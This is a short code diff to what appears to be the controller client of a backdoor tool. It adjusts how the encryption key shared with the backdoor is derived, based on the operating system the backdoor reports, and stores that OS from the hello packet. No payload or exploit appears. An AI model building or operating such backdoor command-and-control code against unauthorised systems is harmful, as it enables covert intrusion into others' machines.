@@ -280,7 +280,6 @@ class Prompt(Cmd):
         write_thread = Thread(target=interactive_mode_write,
             args=(self.sock, self.aes_key))
 
-
         read_thread.start()
         write_thread.start()
 
@@ -331,13 +330,16 @@ class Prompt(Cmd):
     def generate_encryption_key(self, private_key: ec.EllipticCurvePrivateKey,
                                 backdoor_public_key: ec.EllipticCurvePublicKey) -> bytes:
         shared_key = private_key.exchange(ec.ECDH(), backdoor_public_key)
+        if self.os == 'Linux':
+            shared_key = shared_key.hex().encode()
+
         derived_key = HKDF(
             algorithm=hashes.SHA256(),
             length=16,
             salt=None,
             info=b'',
             backend=default_backend()
-        ).derive(shared_key.hex().encode())
+        ).derive(shared_key)
 
         return derived_key
 
@@ -378,6 +380,7 @@ class Prompt(Cmd):
 
     def handle_hello(self, packet: Packet):
         self.backdoor_features = packet.get_argument('features')
+        self.os = packet.get_argument('os')
         backdoor_encryption = packet.get_argument('encryption')
         if not backdoor_encryption['supported']:
             self.print_warning('Communication encryption is not supported by the backdoor.')
